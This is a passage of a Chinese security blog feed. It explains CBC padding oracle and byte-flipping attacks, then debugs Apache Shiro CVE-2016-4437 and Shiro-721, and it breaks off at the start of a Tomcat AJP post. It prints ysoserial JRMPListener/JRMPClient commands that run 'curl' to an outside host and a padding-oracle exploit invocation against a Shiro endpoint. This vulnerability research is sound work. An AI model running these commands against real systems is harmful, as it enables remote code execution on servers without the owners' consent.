    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/" target="_blank" rel="noopener">ctfwiki中对CBC模式的介绍</a>，先看一下CBC模式下的加解密模式图：<br><img src="https://i.loli.net/2020/03/07/f5UJsNlhXrZcvn8.jpg" alt=""></p><p><img src="https://i.loli.net/2020/03/07/qjpLmrAhKxQdnlb.jpg" alt=""></p><p>简单概括一下，加密过程初始化向量IV和第一组明文进行异或，然后经过加密算法得到第一组密文，并拿它作为下一分组加密的IV向量，迭代下去。解密过程反之，先解密再和IV向量异或得到明文plaintext。这里的IV参数是一个随机值(长度和分组长度等长)，为了保证多次加密相同数据生成的密文不同而设计的。</p><p>为了方便后文描述，将IV和Planttext异或后的值称为中间intermediary Value。</p><p><strong>分组的填充padding</strong><br>分组的长度，不同加密算法的长度如下图所示：<br><img src="https://i.loli.net/2020/03/07/JlacVGnqZeI3Sty.jpg" alt=""></p><p>分组密码(block cipher)需要保证总长度是分组长度的整数倍，但一般在最后一组会出现长度不够分组长度的情况，这时候就需要使用padding填充，填充的规则是在最后填充一个固定的值，值的大小为填充的字节总数，即需最后还差2个字节，则填充两个0x02。下边8个字节的填充范围为<code>0x01-0x08</code>。</p><p><img src="https://i.loli.net/2020/03/07/s659b8FhlHRuqix.jpg" alt=""></p><blockquote><p>这种Padding原则遵循的是常见的PKCS#5标准。<a href="http://www.di-mgt.com.au/cryptopad.html#PKCS5" target="_blank" rel="noopener">http://www.di-mgt.com.au/cryptopad.html#PKCS5</a></p></blockquote><h3 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>攻击者知道密文和初始向量IV</li><li>padding错误和padding正确服务器可返回不一样的状态</li></ol><p><strong>攻击效果</strong><br>正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>以这样一个程序为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E</span><br></pre></td></tr></table></figure></p><p>前16个字母(8字节)<code>0000000000000000</code>为IV，后32字母(16字节)为密文：<br><img src="https://i.loli.net/2020/03/07/tPgIkSDaCsdwVn1.jpg" alt=""></p><p><strong>padding 0x01</strong><br>通常程序校验padding是否正确是通过检查末尾的那个字节的值，我们可以通过修改IV的值使得其与中间量intermediary Value异或得到的结果(plaintext)最后一个字节(填充位)为0x01。</p><p>实现这样一个穷举的过程，需要改变IV的最后一个字节(最多255次)，且需要服务端将判断padding校验的结果返回给客户端(类似于布尔注入的逻辑)。比如在web应用中，padding正确(解密的内容不正确)返回200，padding错误(解密内容错误)返回500。</p><p><img src="https://i.loli.net/2020/03/07/C4Geb3w2WPHAQXd.jpg" alt=""></p><p>至此通过上述步骤，我们可以通过<code>IV</code>(fuzz出的IV)和<code>0x01</code>异或得到intermediary Value中间值。</p><p>在<em>单个分组</em>的情况下，其实我们拿着intermediary Value和<em>初始向量IV</em>异或，即可拿到最后明文的最后一个字节：<br><img src="https://i.loli.net/2020/03/07/7HiNObjseCl94zW.jpg" alt="-w824"></p><p><strong>padding 0x02</strong><br>此时，通过修改IV第八个字节的值使得最后一个padding位变成0x02(上图中0x67^0x02=0×64)，再fuzz IV第七个字节，使得服务端解出plaintext其填充位为0x02，以此类推。</p><p>总的来说，其实攻击的本质都是为了得到中间临时变量intermediary value，通过其和初始IV计算出明文。</p><p><strong>多分组密文情况</strong><br>上面说到的Padding Oracle Attack是以单个分组进行的，如果密文有多个分组，其最大的区别在于这一分组加密的初始IV向量为上次组加密的结果Ciphertext。</p><p>在多分组密文中，由于密文和IV已知且可控，先拿第一组padding的方式爆破IV推算intermediary value，然后根据原始IV计算出明文，也可以通过修改原始IV控制密文结果；再拿第一二组，用padding的方式爆破intermediary value，此时的初始IV为第一组的密文，以此类推。</p><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>漏洞的关键点在于攻击者能够判断其padding的结果，在使用CBC模式的分组加密算法需要注意这一点，比如让服务端加上异常处理等等。</p><blockquote><p>实验代码：<a href="media/15832217572390/Demo.py">Demo</a></p></blockquote><h3 id="CBC字节反转"><a href="#CBC字节反转" class="headerlink" title="CBC字节反转"></a>CBC字节反转</h3><p>在乌云知识库里有一篇文章的例子说的比较清晰：<a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击-101Approach</a>，<br>再来参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/cbc-zh/" target="_blank" rel="noopener">ctfwiki中对CBC模式的介绍</a>：<br><img src="https://i.loli.net/2020/03/07/b6fdK82s5WYpvqz.jpg" alt="-w852"><br>简单来说，通过构造第n的密文块为<code>C(n) xor P(n+1) xor A</code>，使得第n+1密文块为A(个人觉得CTFWiki这里写错了)，为什么呢？</p><p><code>C(n) xor P(n+1)</code>的结果实际上就是第n+1组的<code>intermediary value</code>，在解密时让<code>intermediary value</code>自己异或自己得全0，然后再异或A得A。如下图所示：</p><p><img src="https://i.loli.net/2020/03/07/KJtiUeSjDydLH3a.jpg" alt=""></p><p>简而言之，通过损坏密文字节来改变明文字节，攻击条件为知道一组明文和密文。</p><h2 id="CVE-2016-4437-Shiro-反序列化-Shiro-lt-1-2-4"><a href="#CVE-2016-4437-Shiro-反序列化-Shiro-lt-1-2-4" class="headerlink" title="CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)"></a>CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro &lt;= 1.2.4版本中存在反序列化漏洞。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>去github上下一个<a href="https://github.com/apache/shiro/archive/shiro-root-1.2.4.zip" target="_blank" rel="noopener">shiro 1.2.4</a>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/shiro.git</span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure></p><p>然后修改shiro/samples/web/pom.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  需要设置编译的版本 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">    ·   <span class="comment">&lt;!--加一个gadget--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>编译：<code>sudo mvn package</code></p><p>爆了这样的错：<br><img src="https://i.loli.net/2020/03/07/LKbT9AjuN4lIoGn.jpg" alt="-w759"><br>先得去搞个jdk1.6来，mac下弃用了，参考这篇文章：<a href="https://blog.csdn.net/q258523454/article/details/84029886，去这里下[mac的jdk1.6][6]。" target="_blank" rel="noopener">https://blog.csdn.net/q258523454/article/details/84029886，去这里下[mac的jdk1.6][6]。</a><br><img src="https://i.loli.net/2020/03/07/gBnOAZ6HlepCmj4.jpg" alt="-w518"></p><p>然后切换到root创一个文件：/var/root/.m2/toolchains.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">toolchains</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--插入下面代码--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">toolchain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provides</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">provides</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这里是你安装jdk的文件目录--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>/Library/Java/JavaVirtualMachines/1.6.0.jdk/<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchains</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再编译就能成功了：<br><img src="https://i.loli.net/2020/03/07/AtzrgTCBJX2wHZn.jpg" alt="-w375"></p><p>将这个war包放到tomcat的webapp目录下，然后访问<code>http://127.0.0.1:8080/shiro/</code>会自动解压：<br><a href="media/15832217572390/samples-web-1.2.4.war">samples-web-1.2.4</a><br><img src="https://i.loli.net/2020/03/07/Bx6IPz1hcFgVtvD.jpg" alt="-w684"></p><p>也可以把它导到idea里打包，接着配置idea，这里踩了坑EDU版本是没有tomcat server的，一定要用旗舰版：<br><img src="https://i.loli.net/2020/03/07/fVLsED7YiGTFJHp.jpg" alt="-w1117"></p><p><img src="https://i.loli.net/2020/03/07/K8ZW1xShFHAXd4M.jpg" alt="-w1078"></p><p><img src="https://i.loli.net/2020/03/07/lz7xb9tFRgyYWsU.jpg" alt="-w870"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>EXP打ysoserial的二链：<a href="media/15832217572390/shiro1.2.4RCE.py">shiro1.2.4RCE</a><br><img src="https://i.loli.net/2020/03/07/pRaKo3Jr4kt9BvP.jpg" alt="-w1167"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>先下个断点：org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin，去login.jsp登录root    secret，选中Remember Me。<br><img src="https://i.loli.net/2020/03/07/OmXryYACU9W2Pnh.jpg" alt="-w1235"><br>在<code>forgetIdentity</code>函数中处理了request和response请求，在response中处理remember me的cookie。<br><img src="https://i.loli.net/2020/03/07/BFuk1ejaoXyOfJT.jpg" alt="-w1315"><br>再跟进<code>rememberIdentity</code>函数：<br><img src="https://i.loli.net/2020/03/07/376DLRayfkHNEvr.jpg" alt="-w1234"><br>调用<code>convertPrincipalsToBytes</code>将账户信息传入，先是进行序列化，再来一个加密：<br><img src="https://i.loli.net/2020/03/07/8xLMYvaT5cjsun6.jpg" alt="-w1107"><br>跟进<code>encrypt</code>函数：<br><img src="https://i.loli.net/2020/03/07/5EsN1kp76OwaYnu.jpg" alt="-w1237"><br><code>getCipherService</code>先获取了一下加密服务的配置信息，包括加密模式，填充方式，加密类型等等：<br><img src="https://i.loli.net/2020/03/07/glkqJAuHLVInb1P.jpg" alt="-w830"><br><code>cipherService.encrypt</code><br><img src="https://i.loli.net/2020/03/07/yFcJvlCeYtBmXbp.jpg" alt="-w1077"><br>其中秘钥在AbstractRememberMeManager.java中设置的一个定值：<br><img src="https://i.loli.net/2020/03/07/GZ49YHAQSd7ioBu.jpg" alt="-w1220"><br>通过构造方法设置的：<br><img src="https://i.loli.net/2020/03/07/OCbaAIwflgFP452.jpg" alt="-w795"><br><img src="https://i.loli.net/2020/03/07/nYdZpUwJ9WtRogc.jpg" alt="-w690"></p><p>在加密过程中需要关注的一个点，将iv向量放置在密文头部：org/apache/shiro/crypto/JcaCipherService.java<br><img src="https://i.loli.net/2020/03/08/FEYfb3ztTO6892r.jpg" alt="-w1111"></p><p>加密完成后，返回结果传入<code>rememberSerializedIdentity</code>函数，处理http请求，返回cookie到response中：<br><img src="https://i.loli.net/2020/03/07/zaL84qUgITr1pmD.jpg" alt="-w1018"></p><p>到这里cookie加密处理就结束了，再来跟一下是如何解密cookie的。</p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals<br><img src="https://i.loli.net/2020/03/07/qD1Rblso8JFk5gE.jpg" alt="-w1083"><br>先从<code>getRememberedSerializedIdentity</code>函数获取cookie，base64解码：<br><img src="https://i.loli.net/2020/03/07/8eWULN2ctlARsnX.jpg" alt="-w913"></p><p>然后进入<code>convertBytesToPrincipals</code>函数，先是解密，接着反序列化<br><img src="https://i.loli.net/2020/03/07/aTyQLrH1BnCvjol.jpg" alt="-w1183"><br><img src="https://i.loli.net/2020/03/07/BOKl8EhoVzX75Dj.jpg" alt="-w1107"><br><img src="https://i.loli.net/2020/03/07/EiVnb4wKWfRt9ZJ.jpg" alt="-w1031"></p><h3 id="坑点：反序列化限制"><a href="#坑点：反序列化限制" class="headerlink" title="坑点：反序列化限制"></a>坑点：反序列化限制</h3><p>网上大部分文章都是拿common-collections2这调链来复现，畅通无阻。</p><p>我们来试试其他链，把gadget换成ysoserial5打shiro自带的<code>commons-collections-3.2.1</code>，会抛出这样一个错误：<br><img src="https://i.loli.net/2020/03/08/B1vORsbDQIf6PFq.jpg" alt="-w1260"></p><p>再把其组件拉出来单独试试：<br><img src="https://i.loli.net/2020/03/08/87TFURzvVHtYOeq.jpg" alt="-w1570"></p><p>调试分析一下：org/apache/shiro/io/DefaultSerializer.java<br><img src="https://i.loli.net/2020/03/08/9jbleZPJzkhadoR.jpg" alt="-w977"><br>跟进<code>ClassResolvingObjectInputStream</code>类：org/apache/shiro/io/ClassResolvingObjectInputStream.java<br><img src="https://i.loli.net/2020/03/08/G5tTdaBLfbsruYj.jpg" alt="-w1236"><br>他继承了<code>ObjectInputStream</code>类，重写了<code>resolveClass</code>方法，再来看一下原版<code>resolveClass</code>方法：<br><img src="https://i.loli.net/2020/03/08/Mb1BkSRdrjmqTE2.jpg" alt="-w1418"></p><p><code>Class.forName</code>和<code>ClassUtils.forName</code>的差别，来看看<code>ClassUtils</code>具体实现：org/apache/shiro/util/ClassUtils.java#forName<br><img src="https://i.loli.net/2020/03/08/xc8CH3kDXUog2nW.jpg" alt="-w1175"><br>shiro不是像原版那样通过<code>java.lang.Class</code>反射获取class，而是通过<code>ParallelWebappClassLoader</code>去加载class<br><img src="https://i.loli.net/2020/03/08/Rn74fdE3lviKpO9.jpg" alt="-w1125"><br>查了一些下资料，看到<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">orange师傅文章</a>评论中说不支持装载数组类型，这里没细跟原因了。<br><img src="https://i.loli.net/2020/03/08/gavj1AIZuzpHbhx.jpg" alt="-w1206"></p><h4 id="JRMP绕过"><a href="#JRMP绕过" class="headerlink" title="JRMP绕过"></a>JRMP绕过</h4><p><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">Orang师傅在文章</a>中一顿操作，发现JRMP可以避开上述限制，测试一下：</p><p>server：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl http://x.x.x.x:8989'</span><br></pre></td></tr></table></figure></p><p>client:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/08/tsU1jzcnL76EokT.jpg" alt="-w659"></p><p>稍微调了一下EXP,大概能行的原因就是走的远程的class加载的，而不是像之前那样直接打本地：<br><img src="https://i.loli.net/2020/03/08/EiaT4phwcOBbCPt.jpg" alt="-w1507"></p><p><img src="https://i.loli.net/2020/03/08/S9Mjhr28QHYEu1f.jpg" alt="-w1239"></p><p>不过有一点比较困惑，用URLDNS打了没结果，但是直接用5链JRMP打却可以…</p><blockquote><p>这里手动膜@hu3sky师傅，教我手挖无数组的gadgets</p></blockquote><h3 id="挖掘3-2-1无数组gadget"><a href="#挖掘3-2-1无数组gadget" class="headerlink" title="挖掘3.2.1无数组gadget"></a>挖掘3.2.1无数组gadget</h3><blockquote><p>先挖坑，挖到再说吧</p></blockquote><h2 id="Shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）"><a href="#Shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）" class="headerlink" title="Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）"></a>Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>EXP用<a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">3ndz/Shiro-721</a>，shiro的版本1.4.1配置过程参考上文。</p><p>yso生成个jrmpclient：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;47.93.226.148:12345&apos; &gt; JRMPClient</span><br></pre></td></tr></table></figure></p><p>服务端起一个jrmplistener<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 &apos;curl http://x.x.x.x:8989&apos;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_padding_oracle.py http://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMe的cookie] JRMPClien</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/09/poL4qfkhUxnFrBV.jpg" alt="-w1479"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看看这个版本对秘钥的处理：org/apache/shiro/mgt/AbstractRememberMeManager.java</p><p><img src="https://i.loli.net/2020/03/09/7OGrJ1jAdaNl9hm.jpg" alt="-w683"></p><p>一直跟进，可以看到将之前的硬编码秘钥换成了动态生成：<br><img src="https://i.loli.net/2020/03/09/uUbnDyr9w74SjYE.jpg" alt="-w878"></p><h4 id="padding错误"><a href="#padding错误" class="headerlink" title="padding错误"></a>padding错误</h4><p>在我们给rememberMe输入错误的padding后，经过上文提到的解密过程后，会抛出异常:/org/apache/shiro/crypto/JcaCipherService.class<br><img src="https://i.loli.net/2020/03/09/Bub7daNSGAPwxe1.jpg" alt="-w1309"><br>然后在org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals捕获<br><img src="https://i.loli.net/2020/03/09/wBSoNMXT1W4iRyd.jpg" alt="-w1341"></p><p>最后在org/apache/shiro/web/servlet/SimpleCookie.java中给返回包设置一个rememberMe的cookie，覆盖掉之前的值：<br><img src="https://i.loli.net/2020/03/09/Xouavkr5TKR62gy.jpg" alt="-w1179"></p><p>调用栈：<br><img src="https://i.loli.net/2020/03/09/qIze16hpPJ9nAYD.jpg" alt="-w594"></p><h4 id="padding正确，反序列化错误"><a href="#padding正确，反序列化错误" class="headerlink" title="padding正确，反序列化错误"></a>padding正确，反序列化错误</h4><p>在之前的padding oracle漏洞中，依靠控制前一块密文来伪造后一块的明文，根据Padding的机制，可构造出一个bool条件，从而逐位得到明文，然后逐块得到所有明文。</p><p>也就是说通过padding获取来伪造明文的，会改变前一块的密文，也就是会影响到解密的结果。我们来看shiro中对于解密结果的处理，在DefaultSerializer.class中进行反序列化时，会失败而抛出异常：<br><img src="https://i.loli.net/2020/03/09/eSDFNz5iod7fBPX.jpg" alt="-w1316"><br>而对于客户端而言，结果是一样的，都走到了AbstractRememberMeManager.java的异常处理：<br><img src="https://i.loli.net/2020/03/09/PF9fCX7my8A2n3p.jpg" alt="-w1187"><br>接着就是给客户端重置rememberMe的cookie。</p><h4 id="拼接序列化数据"><a href="#拼接序列化数据" class="headerlink" title="拼接序列化数据"></a>拼接序列化数据</h4><p>在<a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">gyyy:浅析Java序列化和反序列化</a>这篇文章中介绍了java序列化和反序列化的机制，关键点在于ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。</p><p>所以现在BOOL条件就出来了，拼接无关数据，padding 正确，能正常反序列化，padding错误抛出异常。</p><p>最后payload的构造就是不断的用两个block去padding得到intermediary之后，构造密文使得解密后得到指定明文，最后拼接到原有的cookie上。</p><p>exp: <a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">https://github.com/3ndz/Shiro-721</a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这段时间从密码学到shiro反序列化的几个版本漏洞分析，算法功底还得加强，接下来的时间研究一下shiro反序列化RCE的回显问题。</p><p>参考文章：</p><ul><li><a href="https://saucer-man.com/information_security/396.html" target="_blank" rel="noopener">分析调试apache shiro反序列化漏洞(CVE-2016-4437)</a>                                                    </li><li><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></li><li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">pwn-ctf-platform-with-java-jrmp-gadget</a>    </li><li><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener">Exploiting JVM deserialization vulns despite a broken class loader</a>    </li><li><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">Shiro 721 Padding Oracle攻击漏洞分析</a></li><li><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">p0:Shiro Padding Oracle Attack 反序列化</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat-Ajp 协议漏洞分析(CVE-2020-1938)</title>
    <link href="http://0day.design/2020/03/02/Tomcat-Ajp%20%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(CVE-2020-1938)/"/>
    <id>http://0day.design/2020/03/02/Tomcat-Ajp 协议漏洞分析(CVE-2020-1938)/</id>
    <published>2020-03-02T15:14:00.000Z</published>
    <updated>2020-03-02T15:41:31.539Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持。由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。</p><h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>该漏洞可以用来读取或包含 Tomcat 上所有 webapp目录下的任意文件，文件包含漏洞影响以下版本：</p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>测试版本8.5.16，用的mac下Mxsrvs自带的tomcat。<br>在/bin/catalina.sh文件头部里增加一行，设置调试端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export JPDA_ADDRESS=9901</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/03/02/vkZroWGKeIO184V.jpg" alt="-w783"></p><p>再修改一下startup.sh的最后一行:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; start &quot;$@&quot;</span><br><span class="line">exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; jpda start &quot;$@&quot;</span><br></pre></td></tr></table></figure></p><p>Idea里配置一下<br><img src="https://i.loli.net/2020/03/02/xqcu1pitSarPJD7.jpg" alt="-w978"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>EXP： <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a><br><img src="https://i.loli.net/2020/03/02/Zg1deLMkRTcxS8m.jpg" alt="-w702"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本地测试8.5.16版本，tomcat默认开启三个端口：<br><img src="https://i.loli.net/2020/03/02/T9mLHDfPBAUh3av.jpg" alt="-w751"><br>在/conf/server.xml中配置：<br><img src="https://i.loli.net/2020/03/02/O28YPrCHmxqTQNk.jpg" alt="-w774"><br><img src="https://i.loli.net/2020/03/02/q4azdIu6RT58XMH.jpg" alt="-w480"><br><img src="https://i.loli.net/2020/03/02/Gx6rF2UkmiwpneP.jpg" 